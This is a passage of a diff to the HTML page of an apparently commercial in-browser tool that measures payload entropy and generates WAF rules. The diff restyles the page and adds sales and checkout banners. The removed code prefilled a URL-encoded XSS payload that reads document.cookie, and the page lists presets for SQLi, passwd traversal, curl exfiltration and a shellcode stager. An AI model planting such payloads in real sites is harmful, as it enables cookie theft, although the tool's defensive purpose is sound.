@@ -1,729 +1,1226 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Payload & Entropy Studio | Security Intelligence</title>
+  <title>Payload & Entropy Studio | Sovereign Security Intelligence</title>
+  <meta name="description" content="100% In-Browser Shannon entropy waveform visualizer, obfuscated payload deobfuscator, and automated WAF rule synthesizer. Zero cloud egress.">
+  <meta name="keywords" content="entropy analysis, Shannon entropy, payload deobfuscator, shellcode detector, WAF rule generator, WebCrypto, zero egress">
+  <meta name="author" content="Neal Frazier (@1nc0gn30) • Neal Frazier Tech">
+  
+  <!-- OpenGraph / Twitter -->
+  <meta property="og:title" content="Payload & Entropy Studio | Sovereign Threat Intelligence">
+  <meta property="og:description" content="In-browser Shannon entropy analyzer, byte spectrum histogram, and automated WAF rule synthesizer. Zero cloud egress.">
+  <meta property="og:url" content="https://entropystudio.nullai.tech">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="https://entropystudio.nullai.tech/assets/banner.jpg">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@1nc0gn30">
+  <meta name="twitter:creator" content="@1nc0gn30">
+  <meta name="twitter:image" content="https://entropystudio.nullai.tech/assets/banner.jpg">
+  <link rel="canonical" href="https://entropystudio.nullai.tech">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="icon" type="image/png" href="/assets/icon.png">
+  <script src="https://integrate.depay.com/widgets/v13.js" defer></script>
+
+  <!-- AEO & SEO Schema.org Graph -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebApplication",
+        "@id": "https://entropystudio.nullai.tech/#webapp",
+        "name": "Payload & Entropy Studio",
+        "url": "https://entropystudio.nullai.tech",
+        "applicationCategory": "SecurityApplication",
+        "operatingSystem": "All modern browsers (Chrome, Firefox, Safari, Edge)",
+        "offers": {
+          "@type": "Offer",
+          "price": "19.00",
+          "priceCurrency": "USD",
+          "availability": "https://schema.org/InStock"
+        },
+        "creator": {
+          "@type": "Person",
+          "name": "Neal Frazier",
+          "url": "https://nealfrazier.tech"
+        },
+        "publisher": {
+          "@type": "Organization",
+          "name": "Neal Frazier Tech • NullAI Platform",
+          "url": "https://nullai.tech"
+        }
+      },
+      {
+        "@type": "FAQPage",
+        "@id": "https://entropystudio.nullai.tech/#faq",
+        "mainEntity": [
+          {
+            "@type": "Question",
+            "name": "What is Shannon entropy in cybersecurity?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Shannon entropy measures information density (0.0 to 8.0 bits per byte). Plaintext code averages 4.0-5.2 bits, while encrypted payloads, shellcode, and packed binaries exceed 6.5 bits."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Does Payload & Entropy Studio execute code or upload payloads?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "No. All mathematical transforms, deobfuscation layers, sliding-window canvas waveforms, and WAF rules are computed 100% client-side in your browser with zero remote network egress."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "What is included with the Pro lifetime license?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "A $19 one-time payment unlocks exportable ModSecurity, Cloudflare, AWS WAF, and Snort rule bundles, executive threat reports, and high-resolution waveform exports."
+            }
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&family=Roboto+Mono:wght@400;500;600&family=Roboto:wght@400;500;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+
   <style>
     :root {
-      --g-blue: #B8860B;
-      --g-blue-dark: #8A6A09;
-      --g-blue-light: #FEF9E7;
-      --g-green: #1e8e3e;
-      --g-green-light: #e6f4ea;
-      --g-yellow: #f9ab00;
-      --g-yellow-light: #fef7e0;
-      --g-red: #d93025;
-      --g-red-light: #fce8e6;
-      --g-purple: #9334e6;
-      --g-purple-light: #f3e8fd;
-      --surface: #ffffff;
-      --surface-variant: #f8f9fa;
-      --surface-card: #ffffff;
-      --border: #dadce0;
-      --border-subtle: #e8eaed;
-      --text: #202124;
-      --text-secondary: #5f6368;
-      --code-bg: #f1f3f4;
-      --shadow-sm: 0 1px 2px rgba(60,64,67,0.15), 0 1px 3px 1px rgba(60,64,67,0.1);
-      --shadow-md: 0 4px 8px 3px rgba(60,64,67,0.15);
-      --radius-sm: 8px;
-      --radius-md: 12px;
-      --radius-full: 9999px;
-      --font-sans: 'Google Sans', 'Segoe UI', Roboto, sans-serif;
-      --font-mono: 'Roboto Mono', monospace;
+      --bg: #090a0f;
+      --card-bg: rgba(18, 20, 29, 0.8);
+      --card-border: rgba(255, 215, 0, 0.15);
+      --gold: #ffd700;
+      --gold-dark: #b8860b;
+      --gold-glow: rgba(255, 215, 0, 0.25);
+      --text: #f0f2f5;
+      --text-secondary: #9ba1b0;
+      --accent-red: #ff4757;
+      --accent-green: #2ed573;
+      --accent-blue: #1e90ff;
+      --accent-yellow: #ffa502;
+      --radius: 12px;
     }
-    [data-theme="dark"] {
-      --surface: #1e1f20;
-      --surface-variant: #131314;
-      --surface-card: #28292a;
-      --border: #3c4043;
-      --border-subtle: #2d3134;
-      --text: #e3e3e3;
-      --text-secondary: #9aa0a6;
-      --code-bg: #18191a;
-      --g-blue-light: #1c3b5e;
-      --g-green-light: #133820;
-      --g-red-light: #3c1e1e;
-      --g-yellow-light: #3c3214;
-      --g-purple-light: #2c1a3f;
-    }
+
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: var(--font-sans);
-      background: var(--surface-variant);
+    html, body {
+      overflow-x: hidden !important;
+      max-width: 100vw !important;
+      width: 100% !important;
+      min-height: 100vh;
+      background-color: var(--bg);
       color: var(--text);
-      height: 100vh;
+      font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, sans-serif;
       display: flex;
       flex-direction: column;
-      overflow: hidden;
     }
+
     header {
-      background: var(--surface);
-      border-bottom: 1px solid var(--border);
-      padding: 0.65rem 1.5rem;
+      background: rgba(13, 15, 22, 0.9);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--card-border);
+      padding: 0.9rem 1.5rem;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      z-index: 10;
+      position: sticky;
+      top: 0;
+      z-index: 100;
     }
-    .brand {
+    .brand-wrap {
       display: flex;
       align-items: center;
-      gap: 0.75rem;
-      font-weight: 600;
-      font-size: 1.15rem;
-      color: var(--text);
+      gap: 0.8rem;
     }
-    .brand-icon {
-      width: 32px;
-      height: 32px;
-      background: var(--g-blue-light);
-      color: var(--g-blue);
-      border-radius: var(--radius-sm);
+    .brand-logo {
+      width: 38px;
+      height: 38px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #1e90ff, #ffd700);
+      color: #000;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.1rem;
+      font-weight: 800;
+      font-size: 1.15rem;
+      box-shadow: 0 0 15px var(--gold-glow);
+    }
+    .brand-text h1 {
+      font-size: 1.15rem;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+      color: #fff;
+    }
+    .brand-text p {
+      font-size: 0.72rem;
+      color: var(--text-secondary);
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .header-badges {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
     }
     .badge {
-      font-size: 0.75rem;
-      font-weight: 500;
-      padding: 2px 8px;
-      border-radius: var(--radius-full);
-      background: var(--g-blue-light);
-      color: var(--g-blue);
-    }
-    .header-actions {
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-    .btn-icon {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      color: var(--text);
-      padding: 0.4rem 0.8rem;
-      border-radius: var(--radius-full);
-      font-size: 0.85rem;
-      font-weight: 500;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      gap: 0.4rem;
-      transition: all 0.15s ease;
-    }
-    .btn-icon:hover {
-      background: var(--surface-variant);
-      border-color: var(--text-secondary);
-    }
-    .container {
-      display: grid;
-      grid-template-columns: 320px 1fr;
-      flex: 1;
-      overflow: hidden;
-    }
-    aside {
-      background: var(--surface);
-      border-right: 1px solid var(--border);
-      padding: 1.25rem;
-      overflow-y: auto;
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-    }
-    .section-title {
-      font-size: 0.8rem;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-      color: var(--text-secondary);
-    }
-    .sample-list {
-      display: flex;
-      flex-direction: column;
-      gap: 0.4rem;
-    }
-    .sample-item {
-      padding: 0.6rem 0.75rem;
-      border: 1px solid var(--border-subtle);
-      border-radius: var(--radius-sm);
-      cursor: pointer;
-      background: var(--surface-variant);
-      transition: all 0.15s ease;
-    }
-    .sample-item:hover {
-      border-color: var(--g-blue);
-      background: var(--g-blue-light);
-    }
-    .sample-name {
-      font-size: 0.85rem;
+      font-size: 0.72rem;
+      padding: 4px 10px;
+      border-radius: 999px;
+      font-family: 'JetBrains Mono', monospace;
       font-weight: 600;
-      color: var(--text);
+      border: 1px solid transparent;
     }
-    .sample-desc {
-      font-size: 0.75rem;
-      color: var(--text-secondary);
+    .badge-egress {
+      background: rgba(46, 213, 115, 0.12);
+      color: var(--accent-green);
+      border-color: rgba(46, 213, 115, 0.3);
     }
-    main {
-      padding: 1.25rem 1.5rem;
-      overflow-y: auto;
+    .badge-pro {
+      background: rgba(255, 215, 0, 0.12);
+      color: var(--gold);
+      border-color: rgba(255, 215, 0, 0.35);
+      cursor: pointer;
+    }
+
+    /* Sales Banner */
+    .sales-banner {
+      background: linear-gradient(90deg, rgba(255,215,0,0.12) 0%, rgba(30,144,255,0.12) 100%);
+      border: 1px solid var(--gold);
+      border-radius: var(--radius);
+      padding: 1rem 1.25rem;
+      margin: 1.2rem auto 0;
+      max-width: 1400px;
+      width: calc(100% - 2rem);
       display: flex;
-      flex-direction: column;
-      gap: 1rem;
-    }
-    .card {
-      background: var(--surface-card);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-md);
-      padding: 1.25rem;
-      box-shadow: var(--shadow-sm);
-    }
-    textarea {
-      width: 100%;
-      padding: 0.75rem;
-      border: 1px solid var(--border);
-      border-radius: var(--radius-sm);
-      background: var(--surface);
-      color: var(--text);
-      font-family: var(--font-mono);
-      font-size: 0.9rem;
-      resize: vertical;
-      outline: none;
-    }
-    textarea:focus {
-      border-color: var(--g-blue);
-      box-shadow: 0 0 0 2px var(--g-blue-light);
-    }
-    .threat-banner {
-      display: flex;
+      flex-wrap: wrap;
       align-items: center;
       justify-content: space-between;
-      padding: 0.85rem 1.25rem;
-      border-radius: var(--radius-sm);
-      margin-top: 0.75rem;
-    }
-    .threat-banner.CRITICAL, .threat-banner.HIGH { background: var(--g-red-light); color: var(--g-red); border: 1px solid var(--g-red); }
-    .threat-banner.MEDIUM { background: var(--g-yellow-light); color: #b06000; border: 1px solid var(--g-yellow); }
-    .threat-banner.LOW { background: var(--g-blue-light); color: var(--g-blue); border: 1px solid var(--g-blue); }
-    .threat-banner.INFO { background: var(--g-green-light); color: var(--g-green); border: 1px solid var(--g-green); }
-    .tabs {
-      display: flex;
-      border-bottom: 1px solid var(--border);
-      margin-bottom: 1rem;
-      gap: 0.5rem;
-    }
-    .tab {
-      padding: 0.5rem 1rem;
-      cursor: pointer;
-      font-size: 0.85rem;
-      font-weight: 500;
-      color: var(--text-secondary);
-      border-bottom: 2px solid transparent;
-      transition: all 0.15s ease;
-    }
-    .tab:hover {
-      color: var(--text);
-    }
-    .tab.active {
-      color: var(--g-blue);
-      border-bottom-color: var(--g-blue);
-      font-weight: 600;
-    }
-    .metrics-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-      gap: 0.75rem;
-      margin-bottom: 1rem;
-    }
-    .metric-card {
-      background: var(--surface-variant);
-      border: 1px solid var(--border-subtle);
-      border-radius: var(--radius-sm);
-      padding: 0.75rem;
-      display: flex;
-      flex-direction: column;
-      gap: 0.25rem;
-    }
-    .metric-val {
-      font-size: 1.25rem;
-      font-weight: 700;
-      color: var(--g-blue);
-    }
-    .metric-label {
-      font-size: 0.75rem;
-      color: var(--text-secondary);
-      font-weight: 500;
-    }
-    .canvas-box {
-      background: var(--surface-variant);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-sm);
-      padding: 0.75rem;
-      margin-bottom: 1rem;
+      gap: 1rem;
+      box-shadow: 0 4px 20px rgba(255, 215, 0, 0.1);
       position: relative;
+      z-index: 10;
     }
-    .canvas-title {
-      font-size: 0.8rem;
-      font-weight: 600;
-      color: var(--text-secondary);
-      margin-bottom: 0.5rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    canvas {
-      width: 100%;
-      height: 140px;
-      display: block;
+    .sales-badge-pill {
+      background: var(--gold);
+      color: #000;
+      font-size: 0.68rem;
+      font-weight: 800;
+      padding: 3px 8px;
       border-radius: 4px;
-      background: #0f1115;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-right: 0.5rem;
     }
-    pre {
-      background: var(--code-bg);
-      padding: 1rem;
-      border-radius: var(--radius-sm);
-      overflow-x: auto;
-      font-family: var(--font-mono);
-      font-size: 0.85rem;
-      line-height: 1.45;
-      border: 1px solid var(--border-subtle);
-      white-space: pre-wrap;
-    }
-    .chip {
+    .btn-checkout {
+      background: linear-gradient(135deg, var(--gold), #ffaa00);
+      color: #090a0f;
+      font-weight: 700;
+      font-size: 0.82rem;
+      padding: 8px 16px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      text-decoration: none;
       display: inline-flex;
       align-items: center;
-      gap: 0.25rem;
-      font-size: 0.75rem;
+      gap: 6px;
+    }
+    .btn-solana {
+      background: rgba(153, 69, 255, 0.15);
+      border: 1px solid #9945ff;
+      color: #dfbaec;
       font-weight: 600;
-      padding: 3px 8px;
-      border-radius: var(--radius-full);
-      background: var(--code-bg);
-      border: 1px solid var(--border);
-      margin-right: 4px;
-      margin-bottom: 4px;
+      font-size: 0.82rem;
+      padding: 7px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
     }
-    .chip.cwe { background: var(--g-yellow-light); color: #b06000; border-color: var(--g-yellow); }
-    .chip.mitre { background: var(--g-purple-light); color: var(--g-purple); border-color: var(--g-purple); }
-    .layer-card {
-      background: var(--surface-variant);
-      border: 1px solid var(--border-subtle);
-      border-radius: var(--radius-sm);
-      padding: 0.75rem;
-      margin-bottom: 0.5rem;
+    .btn-activate {
+      background: transparent;
+      border: 1px dashed var(--gold);
+      color: var(--gold);
+      font-size: 0.8rem;
+      padding: 7px 12px;
+      border-radius: 6px;
+      cursor: pointer;
     }
-    .layer-header {
+
+    main {
+      flex: 1;
+      max-width: 1400px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 1.2rem 1rem 3rem;
+      position: relative;
+      z-index: 1;
+    }
+
+    .app-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.2rem;
+      margin-top: 1rem;
+    }
+    @media (max-width: 900px) {
+      .app-grid { grid-template-columns: 1fr; }
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius);
+      padding: 1.25rem;
+      backdrop-filter: blur(8px);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      position: relative;
+    }
+    .card-header {
       display: flex;
       justify-content: space-between;
-      font-weight: 600;
-      font-size: 0.85rem;
-      margin-bottom: 0.25rem;
+      align-items: center;
+      margin-bottom: 0.8rem;
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+      padding-bottom: 0.5rem;
     }
+    .card-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    textarea.code-box {
+      width: 100%;
+      height: 120px;
+      background: rgba(9, 10, 15, 0.85);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 8px;
+      color: #f0f2f5;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82rem;
+      padding: 0.75rem;
+      resize: vertical;
+      line-height: 1.4;
+      margin-bottom: 0.6rem;
+    }
+    textarea.code-box:focus {
+      outline: none;
+      border-color: var(--gold);
+      box-shadow: 0 0 10px var(--gold-glow);
+    }
+
+    .btn-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-bottom: 0.8rem;
+    }
+    .btn-sm {
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      color: #fff;
+      font-size: 0.78rem;
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 600;
+      padding: 6px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      transition: all 0.15s ease;
+    }
+    .btn-sm:hover {
+      background: rgba(255, 255, 255, 0.12);
+      border-color: var(--gold);
+    }
+    .btn-sm.primary {
+      background: linear-gradient(135deg, var(--gold), #e1b12c);
+      color: #000;
+      font-weight: 700;
+      border: none;
+    }
+
+    select.sample-picker {
+      background: rgba(18, 20, 29, 0.9);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      color: #fff;
+      font-size: 0.78rem;
+      padding: 6px 10px;
+      border-radius: 6px;
+      font-family: 'Space Grotesk', sans-serif;
+      max-width: 250px;
+      outline: none;
+    }
+
+    /* Metric Grids */
+    .metrics-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+      gap: 0.6rem;
+      margin-bottom: 0.8rem;
+    }
+    .metric-card {
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 6px;
+      padding: 8px 10px;
+    }
+    .metric-val {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--gold);
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .metric-label {
+      font-size: 0.68rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      margin-top: 2px;
+    }
+
+    canvas.waveform-canvas {
+      width: 100%;
+      height: 140px;
+      background: #06070a;
+      border-radius: 6px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      display: block;
+      margin-bottom: 0.6rem;
+    }
+
+    /* Threat Banner */
+    .threat-banner {
+      border-left: 4px solid;
+      border-radius: 0 8px 8px 0;
+      padding: 10px 14px;
+      margin-bottom: 0.9rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .threat-banner.CRITICAL { border-left-color: var(--accent-red); background: rgba(255,71,87,0.12); color: #ff6b81; }
+    .threat-banner.HIGH { border-left-color: var(--accent-yellow); background: rgba(255,165,2,0.12); color: #ffa502; }
+    .threat-banner.CLEAN { border-left-color: var(--accent-green); background: rgba(46,213,115,0.12); color: var(--accent-green); }
+
+    /* Code Viewers */
+    pre.code-block {
+      background: rgba(6, 8, 12, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      padding: 0.75rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.78rem;
+      max-height: 200px;
+      overflow-y: auto;
+      color: #f1f2f6;
+    }
+
+    /* Paywall */
+    .paywall-wrap {
+      position: relative;
+      border-radius: var(--radius);
+      overflow: hidden;
+      margin-top: 1.2rem;
+    }
+    .paywall-content.locked {
+      filter: blur(6px);
+      pointer-events: none;
+      user-select: none;
+      opacity: 0.4;
+    }
+    .paywall-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: rgba(9, 10, 15, 0.75);
+      backdrop-filter: blur(4px);
+      z-index: 20;
+      padding: 1.5rem;
+      text-align: center;
+    }
+    .paywall-wrap:not(.is-locked) .paywall-overlay { display: none; }
+    .paywall-wrap:not(.is-locked) .paywall-content.locked {
+      filter: none;
+      pointer-events: auto;
+      user-select: auto;
+      opacity: 1;
+    }
+    .lock-box {
+      max-width: 480px;
+      background: rgba(18, 20, 29, 0.95);
+      border: 1px solid var(--gold);
+      border-radius: var(--radius);
+      padding: 1.5rem;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8), 0 0 20px var(--gold-glow);
+    }
+
+    /* Modal */
+    .modal-backdrop {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      padding: 1rem;
+    }
+    .modal-backdrop.open { display: flex; }
+    .modal-card {
+      background: #10121a;
+      border: 1px solid var(--gold);
+      border-radius: var(--radius);
+      max-width: 540px;
+      width: 100%;
+      padding: 1.8rem;
+      box-shadow: 0 0 30px rgba(255, 215, 0, 0.25);
+      position: relative;
+    }
+    .modal-close {
+      position: absolute;
+      top: 1rem;
+      right: 1.2rem;
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      font-size: 1.3rem;
+      cursor: pointer;
+    }
+    .modal-features {
+      list-style: none;
+      margin: 1rem 0;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+      font-size: 0.85rem;
+    }
+    .modal-features li span { color: var(--gold); font-weight: 700; margin-right: 0.4rem; }
+
+    footer.zoth-footer {
+      border-top: 1px solid var(--card-border);
+      background: rgba(10, 11, 16, 0.95);
+      padding: 1.5rem 1rem;
+      text-align: center;
+      font-size: 0.82rem;
+      color: var(--text-secondary);
+      margin-top: auto;
+    }
+    footer.zoth-footer a { color: var(--gold); text-decoration: none; }
   </style>
-  <link rel="stylesheet" href="atelier.css">
 </head>
 <body>
+
   <header>
-    <div class="brand">
-      <div class="brand-icon">🛡️</div>
-      <span>Payload & Entropy Studio</span>
-      <span class="badge">Shannon Profiler & Threat Analyzer • Material 3 Influenced</span>
+    <div class="brand-wrap">
+      <div class="brand-logo" alt="Payload Entropy Studio Shield">📊</div>
+      <div class="brand-text">
+        <h1>Payload & Entropy Studio</h1>
+        <p>Shannon Waveform Analyzer & WAF Synthesizer</p>
+      </div>
     </div>
-    <div class="header-actions">
-      <span id="benchmark-tag" style="font-size:0.75rem; color:var(--text-secondary); font-family:var(--font-mono); margin-right:0.5rem;">⚡ 0.00 ms</span>
-      <button class="btn-icon" onclick="toggleTheme()">🌓 Theme</button>
-      <button class="btn-icon" onclick="copyWafRule()">📋 Copy WAF Rule</button>
+    <div class="header-badges" style="display:flex; align-items:center; gap:0.5rem;">
+      <span class="badge badge-egress">ZERO CLOUD EGRESS</span>
+      <span class="badge badge-pro" id="headerProBadge" onclick="openLicenseModal()" style="cursor:pointer;">FREE TIER</span>
+      <button class="btn-activate" id="activateKeyBtn" onclick="openLicenseModal()" style="padding:4px 10px; font-size:11px; cursor:pointer;">🔑 UNLOCK PRO</button>
     </div>
   </header>
 
-  <div class="container">
-    <aside>
-      <div class="section-title">Attack Vector Library</div>
-      <div class="sample-list">
-        <div class="sample-item" onclick="loadSample('xss')">
-          <div class="sample-name">Obfuscated XSS</div>
-          <div class="sample-desc">URL-encoded event execution</div>
-        </div>
-        <div class="sample-item" onclick="loadSample('sqli')">
-          <div class="sample-name">SQLi Union & Time Blind</div>
-          <div class="sample-desc">Tautology + SLEEP benchmark</div>
-        </div>
-        <div class="sample-item" onclick="loadSample('lfi')">
-          <div class="sample-name">Multi-Layer LFI Traversal</div>
-          <div class="sample-desc">Double URL-encoded /etc/passwd</div>
-        </div>
-        <div class="sample-item" onclick="loadSample('cmd')">
-          <div class="sample-name">Command Injection</div>
-          <div class="sample-desc">Subshell pipe & curl exfil</div>
-        </div>
-        <div class="sample-item" onclick="loadSample('ssti')">
-          <div class="sample-name">SSTI Template Injection</div>
-          <div class="sample-desc">Jinja2 class mro traversal</div>
-        </div>
-        <div class="sample-item" onclick="loadSample('shellcode')">
-          <div class="sample-name">High-Entropy Shellcode</div>
-          <div class="sample-desc">Packed raw binary bytes</div>
-        </div>
+  <!-- Sales Banner -->
+  <div class="sales-banner" id="salesBanner">
+    <div>
+      <span class="sales-badge-pill">FOUNDING MEMBER DEAL</span>
+      <strong style="color:#fff;">Sovereign Security License — $19 Lifetime (<del>$79 Regular</del>)</strong>
+      <div style="font-size:0.8rem; color:var(--text-secondary); margin-top:3px;">
+        Unlock automated ModSecurity, AWS WAF, and Cloudflare rules, deobfuscation pipelines, and executive threat exports.
       </div>
-
-      <div class="section-title" style="margin-top:1rem;">Entropy Legend</div>
-      <div style="font-size:0.75rem; display:flex; flex-direction:column; gap:0.4rem; color:var(--text-secondary);">
-        <div style="display:flex; align-items:center; gap:0.4rem;"><span style="width:10px; height:10px; border-radius:2px; background:#d93025; display:inline-block;"></span> 6.8+ bits: Shellcode / Crypto</div>
-        <div style="display:flex; align-items:center; gap:0.4rem;"><span style="width:10px; height:10px; border-radius:2px; background:#f9ab00; display:inline-block;"></span> 5.6 - 6.8: Obfuscated Data</div>
-        <div style="display:flex; align-items:center; gap:0.4rem;"><span style="width:10px; height:10px; border-radius:2px; background:#B8860B; display:inline-block;"></span> 4.5 - 5.6: Code & Scripts</div>
-        <div style="display:flex; align-items:center; gap:0.4rem;"><span style="width:10px; height:10px; border-radius:2px; background:#1e8e3e; display:inline-block;"></span> 1.0 - 4.5: Normal Text</div>
-      </div>
-    </aside>
-
-    <main>
-      <!-- Input Card -->
-      <div class="card">
-        <div class="section-title">Suspicious Attack Payload</div>
-        <textarea id="payload-input" rows="3" oninput="runFullAnalysis()">%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</textarea>
-        <div id="threat-container"></div>
-      </div>
-
-      <!-- Analysis Tabs -->
-      <div class="card">
-        <div class="tabs">
-          <div class="tab active" onclick="switchTab('entropy')">Entropy & Waveform</div>
-          <div class="tab" onclick="switchTab('threat')">Threat Breakdown</div>
-          <div class="tab" onclick="switchTab('deobf')">De-obfuscation Layers</div>
-          <div class="tab" onclick="switchTab('waf')">WAF Rule Generator</div>
-        </div>
-
-        <!-- Tab 1: Entropy -->
-        <div id="tab-entropy">
-          <div class="metrics-grid" id="entropy-metrics"></div>
-
-          <div class="canvas-box">
-            <div class="canvas-title">
-              <span>Sliding Window Shannon Entropy Waveform ($H(X)$ vs Byte Offset)</span>
-              <span id="window-status" style="font-size:0.75rem;">Window Size: 32 bytes</span>
-            </div>
-            <canvas id="sliding-canvas" width="800" height="150"></canvas>
-          </div>
-
-          <div class="canvas-box">
-            <div class="canvas-title">
-              <span>256-Bin Byte Frequency Distribution Spectrum</span>
-              <span style="font-size:0.75rem; color:var(--text-secondary);">0x00 - 0xFF ASCII & Extended Range</span>
-            </div>
-            <canvas id="spectrum-canvas" width="800" height="130"></canvas>
-          </div>
-        </div>
-
-        <!-- Tab 2: Threat Breakdown -->
-        <div id="tab-threat" style="display:none;">
-          <div id="threat-details"></div>
-        </div>
-
-        <!-- Tab 3: Deobfuscation -->
-        <div id="tab-deobf" style="display:none;">
-          <div id="deobf-details"></div>
-        </div>
-
-        <!-- Tab 4: WAF -->
-        <div id="tab-waf" style="display:none;">
-          <div style="display:flex; gap:0.5rem; margin-bottom:0.75rem;">
-            <button class="btn-icon" onclick="showWaf('modsecurity')">ModSecurity CRS</button>
-            <button class="btn-icon" onclick="showWaf('cloudflare')">Cloudflare WAF</button>
-            <button class="btn-icon" onclick="showWaf('aws_waf')">AWS WAF v2</button>
-            <button class="btn-icon" onclick="showWaf('suricata')">Suricata IDS</button>
-          </div>
-          <pre id="waf-rule-box"></pre>
-        </div>
-      </div>
-    </main>
+    </div>
+    <div style="display:flex; gap:0.5rem; flex-wrap:wrap;">
+      <a href="https://buy.stripe.com/7sI7sA8hM2X8eFG8ww" class="btn-checkout" target="_blank" rel="noopener">
+        💳 Instant Stripe Checkout ($19)
+      </a>
+      <button class="btn-solana" onclick="openDePayCheckout(event)">
+        🪙 Pay with Solana
+      </button>
+      <button class="btn-activate" onclick="openLicenseModal()">
+        🔑 Activate Key
+      </button>
+    </div>
   </div>
 
+  <main>
+    <!-- Top Action Deck -->
+    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.6rem; margin-bottom:0.8rem;">
+      <div style="display:flex; align-items:center; gap:0.5rem; flex-wrap:wrap;">
+        <span style="font-size:0.8rem; font-weight:600; color:var(--text-secondary);">Load Exploit Preset:</span>
+        <select class="sample-picker" id="sampleSelect" onchange="loadPreset(this.value)">
+          <option value="sql">SQLi: Time-based Blind Benchmark</option>
+          <option value="xss">XSS: Obfuscated Hex DOM Vector</option>
+          <option value="cmd">RCE: Encoded Base64 Bash Pipe</option>
+          <option value="shellcode">Shellcode: High-Entropy Metasploit Stager</option>
+          <option value="clean">Clean: Typical JSON API Request</option>
+        </select>
+        <button class="btn-sm" onclick="clearPayload()">Clear</button>
+      </div>
+      <div style="display:flex; align-items:center; gap:0.5rem;">
+        <button class="btn-sm primary" onclick="runAnalysis()">⚡ Compute Waveform & Signatures</button>
+        <button class="btn-sm" onclick="exportThreatBundle()">📥 Export Threat Dossier</button>
+      </div>
+    </div>
+
+    <!-- Payload Input Area -->
+    <div class="card" style="margin-bottom:1.2rem;">
+      <div class="card-header">
+        <span class="card-title">🔍 Inspectable Payload Buffer</span>
